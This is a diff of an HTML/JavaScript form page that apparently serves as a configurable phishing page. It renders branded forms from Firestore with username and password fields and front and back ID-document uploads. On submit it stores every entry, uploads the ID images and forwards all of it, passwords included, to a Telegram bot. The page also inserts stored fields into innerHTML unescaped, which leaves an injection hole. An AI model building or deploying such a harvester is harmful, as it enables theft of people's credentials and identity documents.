@@ -3,11 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Form</title>
+<title>Dynamic Form</title>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <style>
   body { font-family: Arial, sans-serif; margin:0; padding:0; }
   #formContainer { position: relative; width:100%; min-height:100vh; padding:20px; box-sizing:border-box; overflow:auto; }
@@ -32,33 +31,33 @@ firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 const storage = firebase.storage();
 
-// EmailJS initialization
-emailjs.init("YOUR_EMAILJS_USER_ID"); // <-- Replace
+const getFormId = () => {
+  const params = new URLSearchParams(window.location.search);
+  return params.get('id');
+};
 
-const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"; // <-- Replace
-const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // <-- Replace
-
-const getFormId = () => new URLSearchParams(window.location.search).get('id');
-
-function sendTelegramAlert(message){
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-  }).catch(err=>console.error("Telegram error:", err));
-}
-
-function sendEmailAlert(subject, body){
-  emailjs.send("YOUR_EMAILJS_SERVICE_ID", "YOUR_EMAILJS_TEMPLATE_ID", {
-    subject: subject,
-    message: body
-  }).catch(err=>console.error("EmailJS error:", err));
-}
-
+// Upload file to Firebase Storage
 async function uploadFile(file){
-  const ref = storage.ref().child(`form_uploads/${Date.now()}_${file.name}`);
-  const snapshot = await ref.put(file);
+  const storageRef = storage.ref().child('uploads/' + Date.now() + '_' + file.name);
+  const snapshot = await storageRef.put(file);
   return await snapshot.ref.getDownloadURL();
+}
+
+// Telegram alert (replace with your bot token and chat ID)
+function sendTelegramAlert(message){
+  const botToken = "YOUR_BOT_TOKEN";
+  const chatId = "YOUR_CHAT_ID";
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({chat_id:chatId,text:message})
+  });
+}
+
+// Email alert via EmailJS or similar service
+function sendEmailAlert(subject, message){
+  // Example: Replace with your email service
+  console.log("Email alert:", subject, message);
 }
 
 function renderForm(data) {
@@ -74,121 +73,143 @@ function renderForm(data) {
   content.className = "livePreviewContent";
   content.style.color = data.textColor || "#222";
 
+  if (data.avatarURL) content.innerHTML += `<img src="${data.avatarURL}" style="width:90px;border-radius:50%;display:block;margin:auto">`;
+  if (data.logoURL) content.innerHTML += `<img src="${data.logoURL}" style="width:140px;display:block;margin:auto">`;
+
   content.innerHTML += `<h2 style="text-align:center;color:${data.titleColor||'#111'}">${data.title||''}</h2>`;
+  content.innerHTML += `<p style="text-align:center;color:${data.subtitleColor||'#555'}">${data.subtitle||''}</p>`;
+  if (data.description) content.innerHTML += `<p>${data.description}</p>`;
+
+  if (data.galleryImages) data.galleryImages.forEach(img => img && content.innerHTML += `<img src="${img}">`);
+
+  if (data.videoLinks) {
+    data.videoLinks.forEach(link => {
+      link = link.trim();
+      if (!link) return;
+      let videoEl;
+      if (link.endsWith(".mp4") || link.endsWith(".webm")) {
+        videoEl = document.createElement("video");
+        videoEl.src = link; videoEl.controls = true;
+        videoEl.style.width="100%"; videoEl.style.borderRadius="6px"; videoEl.style.margin="6px 0";
+      } else {
+        const videoId = link.split("v=")[1]?.split("&")[0];
+        if(videoId){
+          videoEl = document.createElement("iframe");
+          videoEl.src = `https://www.youtube.com/embed/${videoId}`;
+          videoEl.width="100%"; videoEl.height="315"; videoEl.frameBorder="0";
+          videoEl.allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture";
+          videoEl.allowFullscreen = true; videoEl.style.margin="6px 0";
+        }
+      }
+      if(videoEl) content.appendChild(videoEl);
+    });
+  }
+
+  if(data.enableWarning && data.warningPosition !== "none"){
+    content.innerHTML += `<p style="color:#b71c1c;text-align:${data.warningPosition||'center'}">${data.warning}</p>`;
+  }
 
   const fDiv = document.createElement("div");
-  fDiv.style.display="flex";
-  fDiv.style.flexDirection="column";
-  fDiv.style.alignItems = "center";
-  fDiv.style.gap="8px";
-
-  const formFields = [];
+  fDiv.style.display="flex"; fDiv.style.flexDirection="column"; fDiv.style.alignItems="center"; fDiv.style.gap="8px";
 
   // Auth Fields
   if(data.addAuth){
     const usernameInput = document.createElement("input");
     usernameInput.placeholder = data.usernamePlaceholder||'Username';
     const passwordInput = document.createElement("input");
-    passwordInput.type = "password";
-    passwordInput.placeholder = data.passwordPlaceholder||'Password';
-    fDiv.appendChild(usernameInput);
-    fDiv.appendChild(passwordInput);
-    formFields.push({label:"Username", element:usernameInput});
-    formFields.push({label:"Password", element:passwordInput});
+    passwordInput.type = "password"; passwordInput.placeholder = data.passwordPlaceholder||'Password';
+    fDiv.appendChild(usernameInput); fDiv.appendChild(passwordInput);
   }
 
   // Extra Fields
-  if(data.extraFields && data.extraFields.length){
-    data.extraFields.forEach(f=>{
-      if(f){
-        const input = document.createElement("input");
-        input.placeholder = f;
-        fDiv.appendChild(input);
-        formFields.push({label:f, element:input});
-      }
-    });
-  }
+  if(data.extraFields) data.extraFields.forEach(f=>{
+    if(f){ const input=document.createElement("input"); input.placeholder=f; fDiv.appendChild(input);}
+  });
 
-  // File Upload Fields
-  const fileFields = [];
-  if(data.idFrontChk){
-    const input = document.createElement("input");
-    input.type = "file";
-    input.placeholder = data.idFrontText || "Upload Front ID";
-    fDiv.appendChild(input);
-    fileFields.push({label:data.idFrontText||"Front ID", element:input});
-  }
-  if(data.idBackChk){
-    const input = document.createElement("input");
-    input.type = "file";
-    input.placeholder = data.idBackText || "Upload Back ID";
-    fDiv.appendChild(input);
-    fileFields.push({label:data.idBackText||"Back ID", element:input});
-  }
+  // File uploads
+  if(data.idFrontChk){ const input=document.createElement("input"); input.type="file"; input.placeholder=data.idFrontText||"Front ID"; fDiv.appendChild(input);}
+  if(data.idBackChk){ const input=document.createElement("input"); input.type="file"; input.placeholder=data.idBackText||"Back ID"; fDiv.appendChild(input);}
 
   // Submit Button
   const submitBtn = document.createElement("button");
-  submitBtn.textContent = data.buttonText || "Submit";
-  submitBtn.style.background = data.btnColor || "#1976d2";
-  submitBtn.style.color = "#fff";
-  submitBtn.style.padding = "10px";
-  submitBtn.style.border="none";
-  submitBtn.style.borderRadius="6px";
+  submitBtn.textContent = data.buttonText||"Submit";
+  submitBtn.style.background=data.btnColor||"#1976d2";
+  submitBtn.style.color="#fff"; submitBtn.style.padding="10px"; submitBtn.style.border="none"; submitBtn.style.borderRadius="6px";
 
-  submitBtn.onclick = async ()=>{
+  submitBtn.onclick = async () => {
     submitBtn.disabled = true;
     const formData = {};
-    formFields.forEach(f => formData[f.label] = f.element.value);
 
-    // Upload files
-    for(const f of fileFields){
-      if(f.element.files.length > 0){
-        const url = await uploadFile(f.element.files[0]);
-        formData[f.label] = url; // replace local file with URL
-      }
+    // Inputs
+    const inputs = container.querySelectorAll("input");
+    for(const input of inputs){
+      if(input.type==="file" && input.files.length>0){
+        const url = await uploadFile(input.files[0]);
+        formData[input.placeholder||"File"]=url;
+      } else formData[input.placeholder||"Field"]=input.value;
     }
 
-    // Save to Firebase
-    db.collection("form_submissions").add({
-      formId: getFormId(),
-      data: formData,
-      timestamp: new Date()
-    }).then(()=>{
-      alert("Form submitted successfully!");
+    // Textareas
+    const textareas = container.querySelectorAll("textarea");
+    textareas.forEach(t => formData[t.placeholder||"Textarea"]=t.value);
 
-      let alertMsg = `New Form Submission (ID: ${getFormId()}):\n` + 
-                     Object.entries(formData).map(([k,v])=>`${k}: ${v}`).join("\n");
+    // Selects
+    const selects = container.querySelectorAll("select");
+    selects.forEach(s => formData[s.name||s.id||"Select"]=s.value);
 
-      sendTelegramAlert(alertMsg);
-      sendEmailAlert("New Form Submission", alertMsg);
-
-      submitBtn.disabled = false;
-    }).catch(err=>{
-      alert("Error submitting form: "+err);
-      submitBtn.disabled = false;
+    // Buttons with styles
+    container.querySelectorAll("button").forEach((btn,i)=>{
+      formData[`Button_${i+1}`]={text:btn.textContent,background:btn.style.background,color:btn.style.color,width:btn.offsetWidth+"px",height:btn.offsetHeight+"px",position:btn.style.position||"",top:btn.style.top||"",left:btn.style.left||""};
     });
-  };
-  fDiv.appendChild(submitBtn);
 
+    // Images with styles
+    container.querySelectorAll("img").forEach((img,i)=>{
+      formData[`Image_${i+1}`]={src:img.src,width:img.width+"px",height:img.height+"px",borderRadius:img.style.borderRadius,margin:img.style.margin};
+    });
+
+    // Videos
+    container.querySelectorAll("video,iframe").forEach((vid,i)=>{
+      formData[`Video_${i+1}`]={src:vid.src,width:vid.width+"px",height:vid.height+"px",borderRadius:vid.style.borderRadius,margin:vid.style.margin};
+    });
+
+    // Dynamic items
+    container.querySelectorAll(".embedLink,.galleryItem").forEach((el,i)=>{
+      formData[`DynamicItem_${i+1}`]={content:el.innerText||el.href,background:el.style.background,color:el.style.color,fontSize:el.style.fontSize,padding:el.style.padding,margin:el.style.margin};
+    });
+
+    // Save to Firebase
+    db.collection("form_submissions").add({formId:getFormId(),data:formData,timestamp:new Date()})
+    .then(()=>{
+      alert("Form submitted successfully!");
+      let alertMsg=`New Form Submission (ID:${getFormId()}):\n`;
+      Object.entries(formData).forEach(([k,v])=>{alertMsg+=typeof v==="object"?`${k}: ${JSON.stringify(v, null, 2)}\n`:`${k}: ${v}\n`;});
+      sendTelegramAlert(alertMsg);
+      sendEmailAlert("New Form Submission",alertMsg);
+      submitBtn.disabled=false;
+    }).catch(err=>{alert("Error submitting form:"+err); submitBtn.disabled=false;});
+  };
+
+  fDiv.appendChild(submitBtn);
   content.appendChild(fDiv);
   container.appendChild(content);
 }
 
-// Load form by ID
+// Load form from Firestore
 const formId = getFormId();
 if(formId){
   db.collection("forms").doc(formId).get().then(doc=>{
     if(doc.exists){
       const data = doc.data();
-      data.extraFields = data.extraFields || [];
+      data.galleryImages = data.galleryImages||[];
+      data.galleryItems = data.galleryItems||[];
+      data.customFields = data.customFields||[];
+      data.embedLinks = data.embedLinks||[];
+      data.extraButtons = data.extraButtons||[];
+      data.videoLinks = data.videoLinks||[];
       renderForm(data);
-    } else {
-      document.getElementById("formContainer").innerHTML = "<p>Form not found.</p>";
-    }
+    } else container.innerHTML="<p>Form not found.</p>";
   });
-}else{
-  document.getElementById("formContainer").innerHTML = "<p>No form ID provided in URL.</p>";
-}
+}else container.innerHTML="<p>No form ID provided in URL.</p>";
 </script>
 </body>
 </html>
